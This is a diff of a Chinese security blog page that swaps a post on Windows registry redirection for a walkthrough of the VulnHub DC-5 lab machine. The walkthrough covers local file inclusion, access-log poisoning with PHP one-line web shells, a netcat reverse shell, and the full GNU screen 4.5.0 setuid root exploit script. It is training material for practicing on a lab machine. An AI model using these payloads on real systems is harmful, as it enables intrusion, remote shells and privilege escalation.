@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="注册表重定向, 域名之外">
-    <meta name="description" content="写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。">
+    <meta name="keywords" content="VulnHub仿真靶机渗透之DC-5 【DC系列】, 域名之外">
+    <meta name="description" content="这次渗透是DC系列（VulnHub的仿真靶机）的DC-5，包含了日志文件getshell、suid提权-screen 4.5.0等知识。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>注册表重定向 | 域名之外</title>
+    <title>VulnHub仿真靶机渗透之DC-5 【DC系列】 | 域名之外</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -320,12 +320,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">注册表重定向</h1>
+                    <h1 class="description center-align post-title">VulnHub仿真靶机渗透之DC-5 【DC系列】</h1>
                 </div>
             </div>
         </div>
@@ -349,8 +349,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                <span class="chip bg-color">合规基线相关</span>
+                            <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">DC系列靶机</span>
                             </a>
                         
                     </div>
@@ -361,8 +361,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF/" class="post-category">
-                                合规基线
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                仿真靶机渗透
                             </a>
                         
                     </div>
@@ -374,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-07-19
+                    2022-03-14
                 </div>
                 
 
@@ -395,45 +395,156 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。</p>
+                <p>这次渗透是DC系列（VulnHub的仿真靶机）的DC-5，包含了日志文件getshell、suid提权-screen 4.5.0等知识。</p>
 <span id="more"></span>
-<h1 id="重定向技术😊"><a href="#重定向技术😊" class="headerlink" title="重定向技术😊"></a>重定向技术😊</h1><h4 id="重定向技术适用版本："><a href="#重定向技术适用版本：" class="headerlink" title="重定向技术适用版本："></a>重定向技术适用版本：</h4><p>Windows XP X64、Windows Server 2003 X64及以后的X64版本。</p>
-<h4 id="重定向技术产生原因：为了确保32位程序能够顺利运行"><a href="#重定向技术产生原因：为了确保32位程序能够顺利运行" class="headerlink" title="重定向技术产生原因：为了确保32位程序能够顺利运行"></a>重定向技术产生原因：为了确保32位程序能够顺利运行</h4><p>为了将32位程序和64位程序分离开，产生了一种模拟器（WOW64，Windows 32 on Windows 64），WOW64 模拟器让我们可以在64位平台上运行32位程序，它在系统层中另外提供了一层，来支持老式的32位程序。</p>
-<h3 id="一：重定向-文件重定向"><a href="#一：重定向-文件重定向" class="headerlink" title="一：重定向-文件重定向"></a>一：重定向-文件重定向</h3><p>ps: 这种文件重定向对于每个32位应用程序默认打开的，但是也可以通过调用API关闭</p>
-<h4 id="文件重定向原因：为了确保32位程序能够顺利运行"><a href="#文件重定向原因：为了确保32位程序能够顺利运行" class="headerlink" title="文件重定向原因：为了确保32位程序能够顺利运行"></a>文件重定向原因：为了确保32位程序能够顺利运行</h4><p>windows对32位应用程序和64位应用程序有分开存放机制：</p>
-<p>对于64位，文件通常被放在%windir%\system32                和              %ProgramFiles%</p>
-<p>————-&gt;               C:\Windows\system32                           和                C:\program files。</p>
-<p>对于32位，文件通常被放在%windir%\syswow64                和              %ProgramFiles(x86)</p>
-<p>————-&gt;               C:\Windows\syswow64                          和              C:\program files (x86)。</p>
-<p>system32目录下都是64位的dll，只能支持64位程序使用，32位程序不能使用。而syswow64目录下都是32位的dll，可以支持32位程序使用。</p>
-<h4 id="文件重定向产生场景："><a href="#文件重定向产生场景：" class="headerlink" title="文件重定向产生场景："></a>文件重定向产生场景：</h4><p>32位程序访问%windir%\system32   或者  %ProgramFiles%   时候，会发生文件重定向。</p>
-<h4 id="文件重定向具体指向："><a href="#文件重定向具体指向：" class="headerlink" title="文件重定向具体指向："></a>文件重定向具体指向：</h4><p>%windir%\system32                      到                     %windir%\syswow64的重定向。</p>
-<p>%ProgramFiles%                           到                        C:\Program Files (x86)</p>
-<h4 id="文件重定向具体含义："><a href="#文件重定向具体含义：" class="headerlink" title="文件重定向具体含义："></a>文件重定向具体含义：</h4><p>32位应用程序去访问%windir%\system32，系统会自动跳转到%windir%\syswow64目录下面，syswow64目录下都是32位程序的dll，才能够让32位程序顺利加载【system32目录下面的64位dll不能让32位程序使用】。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719173156334.png" alt="image-20220719173156334"></p>
-<h3 id="二：重定向-注册表重定向"><a href="#二：重定向-注册表重定向" class="headerlink" title="二：重定向-注册表重定向"></a>二：重定向-注册表重定向</h3><p>64位Windows的注册表分为 32 位注册表项和 64 位注册表项，许多 32 位注册表项与其相应的 64 位注册表项同名。<br>64 位版本的注册表编辑器中，32 位注册表项显示在 <code>HKEY_LOCAL_MACHINE\Software\WOW6432Node</code> 注册表项下。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719175758828.png" alt="image-20220719175758828"></p>
-<p>打开64位注册表【运行-&gt;regedit】</p>
-<p>打开32位注册表【运行-&gt;%systemroot%\syswow64\regedit】</p>
-<h4 id="注册表重定向产生原因：防止注册表键冲突"><a href="#注册表重定向产生原因：防止注册表键冲突" class="headerlink" title="注册表重定向产生原因：防止注册表键冲突"></a>注册表重定向产生原因：防止注册表键冲突</h4><h4 id="注册表重定向实质：维护两套不同的注册表键【64位和32位】"><a href="#注册表重定向实质：维护两套不同的注册表键【64位和32位】" class="headerlink" title="注册表重定向实质：维护两套不同的注册表键【64位和32位】"></a>注册表重定向实质：维护两套不同的注册表键【64位和32位】</h4><p>ps：</p>
-<p><strong>注册表反射</strong>：【适用版本：windows xp、windows server2003等，从win7和winserver 2008 r2开始WOW64就不使用反射机制了，以前通过反射改的key都改为共享了】        维护两套不同的注册表重定向很多是通过：注册表反射机制完成的，但是不是所有的键值都会受到反射机制影响。</p>
-<p>​                      注册表反射是在64 位注册表视图和 32 位注册表视图之间<strong>复制</strong>某些特定的注册表项和项值。</p>
-<h4 id="注册表分类："><a href="#注册表分类：" class="headerlink" title="注册表分类："></a>注册表分类：</h4><p>1：专门给64位程序访问  【除了32位的都是】</p>
-<p>2：专门给32位程序访问  【HKEY_LOCAL_MACHINE\Software\WOW6432Node 路径下的】</p>
-<h4 id="注册表重定向具体举例："><a href="#注册表重定向具体举例：" class="headerlink" title="注册表重定向具体举例："></a>注册表重定向具体举例：</h4><p>应用程序操作注册表的时候32bit方式和64bit方式。运行于64bit系统下的32bit应用程序默认操作32位注册表项（即被重定向到WOW6432Node下的子项）；而64bit应用程序才是操作的直观子项。</p>
-<p>比如，同在64bit系统下，使用如下代码访问注册表：</p>
-<p>​    ::RegOpenKeyEx(HKEY_LOCAL_MACHINE,_T(“Software\Sobey\MPC “), 0,KEY_ALL_ACCESS, &amp;hKey)</p>
-<p>​    如果应用程序为32位子系统，那么实际访问的注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Sobey\MPC；</p>
-<p>​    而如果应用程序为64位子系统，那么实际访问的注册表位置将会是：HKEY_LOCAL_MACHINE\SOFTWARE\Sobey\MPC。</p>
-<p>下面这个可以看到注册表具体项是哪个是反射、重定向还是共享，非常有用。</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winprog64/shared-registry-keys">WOW 下的重定向、共享和反射项 </a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719183751494.png" alt="image-20220719183751494"></p>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/deployment/view-system-registry-with-64-bit-windows">64位视图注册表</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/diaomo9737/article/details/101724390?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-101724390-blog-40922361.pc_relevant_multi_platform_whitelistv1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">Windows:32位程序运行在64位系统上注册表会重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangqin115/article/details/40922361">jiangqin115  - 注册表重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/mmthr/article/details/53932154">mmthr  -  32位程序访问64位  system32文件夹时注意事项</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/crazy_liyang/article/details/68302170">Crzayliyang-架构Young，64位Windows系统注册表的 32 位注册表项和64 位注册表项</a></p>
+<h1 id="VulnHub靶机渗透之DC-5【DC系列】"><a href="#VulnHub靶机渗透之DC-5【DC系列】" class="headerlink" title="VulnHub靶机渗透之DC-5【DC系列】"></a>VulnHub靶机渗透之DC-5【DC系列】</h1><p>kali：192.168.124.134</p>
+<h4 id="主机发现-》获取靶机dc-5的IP地址：192-168-124-135"><a href="#主机发现-》获取靶机dc-5的IP地址：192-168-124-135" class="headerlink" title="主机发现-》获取靶机dc-5的IP地址：192.168.124.135"></a>主机发现-》获取靶机dc-5的IP地址：192.168.124.135</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#获取ip地址</span><br><span class="line">netdiscover -r  192.168.1.0/24</span><br><span class="line">-r  指定ip段</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646913838234.png" alt="1646913838234"></p>
+<h4 id="扫描操作系统类型、开放端口：linux操作系统、-80http、111rpc、54438"><a href="#扫描操作系统类型、开放端口：linux操作系统、-80http、111rpc、54438" class="headerlink" title="扫描操作系统类型、开放端口：linux操作系统、 80http、111rpc、54438"></a>扫描操作系统类型、开放端口：linux操作系统、 80http、111rpc、54438</h4><p>80 http</p>
+<p>111  rpc 【RPC是一个服务，主要是在nfs共享时候负责通知客户端，服务器的nfs端口号的。简单理解rpc就是一个中介服务。】</p>
+<p> 54438端口开放</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646914649410.png" alt="1646914649410"></p>
+<p>脚本是php的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646917392312.png" alt="1646917392312"></p>
+<p>发现Contact模块下可以输入内容，于是尝试多输入几次之后，发现了可疑的地方</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646976777937.png" alt="1646976722824"></p>
+<p>看到有个表单可以提交，提交一下看看，发现了它会被提交到 <code>thankyou.php</code> 这个文件：</p>
+<p>版权时间发生变化。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646976841558.png" alt="1646976841558"></p>
+<p>提交后的页面2017、2018、2019、2020都有，一直在变化 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647052434393.png" alt="1647052434393"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647052483183.png" alt="1647052483183"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647052500157.png" alt="1647052500157"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647052518595.png" alt="1647052518595"></p>
+<p>可以看到相同的页面，只是局部发生了改变，说明这里使用了文件包含。</p>
+<h4 id="动态文件包含√-本地文件包含√-远程文件包含×"><a href="#动态文件包含√-本地文件包含√-远程文件包含×" class="headerlink" title="动态文件包含√   本地文件包含√  远程文件包含×"></a>动态文件包含√   本地文件包含√  远程文件包含×</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</span><br></pre></td></tr></table></figure>
+
+<p>看能不能找到这个包含的文件。</p>
+<p>github上找了一个PHP的字典，用御剑跑了一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646924432992.png" alt="1646924432992"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646924749713.png" alt="1646924749713"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646924705439.png" alt="1646924705439"></p>
+<p>测试一下是否为动态包含</p>
+<p>找到这个脚本是  footer.php，多刷新几次都在变化，时间是会变动，是动态包含。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647052747400.png" alt="1647052747400"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647052691895.png" alt="1647052691895"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647052704265.png" alt="1647052704265"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647052734494.png" alt="1647052734494"></p>
+<p>知道了这个脚本，现在需要知道thankyou.php是如何把footer.php包含的</p>
+<h4 id="文件包含参数爆破【其实我也用了wfuzz工具的，但是当时字典没找好，啥也没爆破出来】"><a href="#文件包含参数爆破【其实我也用了wfuzz工具的，但是当时字典没找好，啥也没爆破出来】" class="headerlink" title="文件包含参数爆破【其实我也用了wfuzz工具的，但是当时字典没找好，啥也没爆破出来】"></a>文件包含参数爆破【其实我也用了wfuzz工具的，但是当时字典没找好，啥也没爆破出来】</h4><h5 id="手工测试"><a href="#手工测试" class="headerlink" title="手工测试"></a>手工测试</h5><p>filename、file等来读取一下&#x2F;etc&#x2F;passwd。</p>
+<p>尝试一下文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.124.135/thankyou.php?firstname=12&amp;lastname=12&amp;country=australia&amp;subject=12  【原】</span><br><span class="line"></span><br><span class="line">http://192.168.124.135/thankyou.php?filename=/etc/passwd   ×</span><br><span class="line"></span><br><span class="line">http://192.168.124.135/thankyou.php?file=/etc/passwd   √</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646914932522.png" alt="1646914932522"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647052892462.png" alt="1647052892462"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646915826684.png" alt="1646915826684"></p>
+<p>很巧，手工测出来了。</p>
+<h5 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h5><p>但是如果在一般情况下，常用的几个都弄完了，我们需要用burp进行爆破一下。</p>
+<p>首先网上找一个好用的字典。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647053494700.png" alt="1647053494700"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647053804383.png" alt="1647053804383"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647053906511.png" alt="1647053906511"></p>
+<p>测试了一下远程文件包含，发现失败了，说明只能本地文件包含。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647058011309.png" alt="1647058011309"></p>
+<h4 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h4><p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647055470976.png" alt="1647055470976"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647055440747.png" alt="1647055440747"></p>
+<p>找到了这些，但是字典还是不够大，没找到可以利用的东西，网上搜索了教程一下发现  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 可以利用。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647055645551.png" alt="1647055645551"></p>
+<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 会记录实时的请求数据报。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647056197254.png" alt="1647056197254"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647056704832.png" alt="1647056650500"></p>
+<h5 id="通过包含日志文件getshell"><a href="#通过包含日志文件getshell" class="headerlink" title="通过包含日志文件getshell"></a>通过包含日志文件getshell</h5><p>既然日志能记录我们的操作，那么我们就写入一句话到日志文件里吧：【通过包含日志文件getshell】</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.124.135/thankyou.php?file=&lt;?php @eval($_REQUEST[&#x27;shell&#x27;])?&gt;</span><br><span class="line"></span><br><span class="line">测试语句：</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">常用php一句话木马：</span><br><span class="line">&lt;?php @eval($_POST[shell]);?&gt;</span><br><span class="line">&lt;?php @eval($_REQUEST[&#x27;shell&#x27;])?&gt;</span><br><span class="line">&lt;?php system($_GET[&#x27;cmd&#x27;]) ?&gt;</span><br><span class="line"></span><br><span class="line">前端的传输方式：</span><br><span class="line">GET	数据从url提交</span><br><span class="line">POST	数据采用隐蔽方式提交</span><br><span class="line">REQUEST	即支持GET方式、又支持POST方式</span><br><span class="line"></span><br><span class="line">后端执行函数：</span><br><span class="line">@ + function表示忽略警告。</span><br><span class="line">eval() 是可以执行php代码</span><br><span class="line">system() 是可以执行系统命令</span><br><span class="line">assert()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>测试一下phpinfo()的php代码可不可以执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647245652373.png" alt="1647245652373"></p>
+<p>phpinfo()的函数执行成功<img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647245824465.png" alt="1647245824465"></p>
+<p>写入php一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&#x27;shell&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647246191533.png" alt="1647246191533"></p>
+<h5 id="中国蚁剑连接成功"><a href="#中国蚁剑连接成功" class="headerlink" title="中国蚁剑连接成功"></a>中国蚁剑连接成功</h5><p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647246256437.png" alt="1647246256437"></p>
+<p>连接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647246334402.png" alt="1647246334402"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>kali： 【在kali端开启监听1234端口。】</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br><span class="line">-l    开启监听</span><br><span class="line">-p   指定一个端口</span><br><span class="line">-v   显示详细输出</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647246892232.png" alt="1647246892232"></p>
+<p>靶机dc5：【dc5反向连接kali的监听端口】</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.124.134  1234 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647246881106.png" alt="1647246881106"></p>
+<p>连接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647247004632.png" alt="1647247004632"></p>
+<p>然后我们使用python获取一个完整的交互式shell，即bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647247104823.png" alt="1647247104823"></p>
+<h4 id="suid提权-screen-4-5-0"><a href="#suid提权-screen-4-5-0" class="headerlink" title="suid提权-screen 4.5.0"></a>suid提权-screen 4.5.0</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"># 看当前账号有哪些无密码可以root权限执行的程序</span><br></pre></td></tr></table></figure>
+
+<p><code>sudo -l</code>没权限，看看<code>suid</code>吧。</p>
+<p>尝试查找具有root权限的SUID的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br><span class="line">find / -perm /4000 2&gt;/dev/null</span><br><span class="line">可以发现系统上运行的所有SUID可执行文件-&gt;尝试查找具有root权限的SUID的文件</span><br><span class="line"></span><br><span class="line">find / -perm -4000  #输出信息会有报错信息。</span><br><span class="line">find / perm -4000 </span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">find / -perm /4000 2&gt;/dev/null</span><br><span class="line">重定向符    &gt; 或者 &gt;&gt;，  两者的区别是：前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部。</span><br><span class="line">/dev/null是一个特殊的设备文件，这个文件接收到任何数据都会被丢弃。因此，null这个设备通常也被称为位桶（bit bucket）或黑洞。</span><br><span class="line">Linux系统预留可三个文件描述符：0、1和2，他们的意义： 0——标准输入（stdin）   1——标准输出（stdout）  2——标准错误（stderr）</span><br><span class="line">而结合以上知识就可以知道，2&gt;/dev/null的意思就是将标准错误stderr删掉</span><br><span class="line"></span><br><span class="line">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \</span><br><span class="line">以上3个都可以起到相同作用</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647248844829.png" alt="1647248844829"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647248738842.png" alt="1647248738842"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647248817828.png" alt="1647248817828"></p>
+<p>【Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU<br>Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。】</p>
+<p>利用screen-4.5.0提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br><span class="line">#在exploitdb里面搜索可以使用的exp</span><br><span class="line">cat /usr/share/exploitdb/exploits/linux/local/41154.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647249218200.png" alt="1647249218200"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># screenroot.sh</span><br><span class="line"># setuid screen v4.5.0 local root exploit</span><br><span class="line"># abuses ld.so.preload overwriting to get root.</span><br><span class="line"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="line"># HACK THE PLANET</span><br><span class="line"># ~ infodox (25/1/2017)</span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell                                                        </span><br></pre></td></tr></table></figure>
+
+<p>这个脚本主要由三部分组成，原本是直接执行脚本，可是这个脚本有问题，所以需要创建2个文件，把每个代码块单独拿出来执行。</p>
+<p>移动目录到&#x2F;tmp下<img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647249737644.png" alt="1647249737644"></p>
+<p>创建第一个文件，并复制一下代码块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi libhax.c</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建第二个文件，复制第二个代码块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi  rootshell.c</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647250487548.png" alt="1647250487548"></p>
+<p>用gcc 编译两个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647251336018.png" alt="1647251336018"></p>
+<p>依次执行以下命令，得到root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc# because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; </span><br><span class="line">screen -ls</span><br><span class="line">/tmp/rootshell           </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647251382398.png" alt="1647251382398"></p>
